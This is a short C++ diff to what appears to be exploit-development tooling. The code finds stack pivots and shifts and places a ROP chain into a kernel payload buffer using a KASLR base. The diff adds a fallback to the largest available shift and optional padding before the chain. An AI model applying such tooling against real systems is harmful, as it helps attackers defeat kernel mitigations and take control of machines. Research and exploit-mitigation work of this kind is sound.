@@ -148,12 +148,13 @@ public:
 
         while (from_offset < min_to_offset) {
             auto shift_remaining = min_to_offset - from_offset;
+
             auto shift = std::lower_bound(pivots_.stack_shifts.begin(),
                 pivots_.stack_shifts.end(), shift_remaining,
                 [](const StackShiftPivot& shift, int x) { return shift.shift_amount < x; });
 
             if (shift == pivots_.stack_shifts.end())
-                return std::nullopt;
+                shift--; // use the largest possible value
 
             while (true) {
                 auto target_offset = from_offset + shift->shift_amount;
@@ -182,23 +183,24 @@ public:
         return shifts->to_offset;
     }
 
-    RopPivotInfo PivotToRop(const RopChain& rop) {
+    RopPivotInfo PivotToRop(const RopChain& rop, int padding_before_rop = 0) {
         auto snapshot = payload_.Snapshot();
         for (auto& pivot : FindInternal(false)) {
             payload_.Restore(snapshot);
             pivot.ApplyToPayload(payload_, rop.kaslr_base_);
 
-            auto rop_min_offset = payload_.FindEmpty(rop.GetByteSize(), 8);
+            auto rop_min_offset = payload_.FindEmpty(padding_before_rop + rop.GetByteSize(), 8);
             if (!rop_min_offset)
                 continue; // not enough space for the ROP chain
 
-            auto shifts = FindShifts(pivot.GetDestinationOffset(), *rop_min_offset);
+            auto rop_min_offset_w_pad = padding_before_rop + *rop_min_offset;
+            auto shifts = FindShifts(pivot.GetDestinationOffset(), rop_min_offset_w_pad);
             if (!shifts || !payload_.CheckFree(shifts->to_offset, rop.GetByteSize()))
                 continue; // no good shift or not enough space for ROP chain after shifts
 
             shifts->Apply(rop.kaslr_base_, payload_);
             payload_.Set(shifts->to_offset, rop.GetData());
-            return RopPivotInfo { rop, pivot, *rop_min_offset, shifts->to_offset, *shifts };
+            return RopPivotInfo { rop, pivot, rop_min_offset_w_pad, shifts->to_offset, *shifts };
         }
 
         payload_.Restore(snapshot);
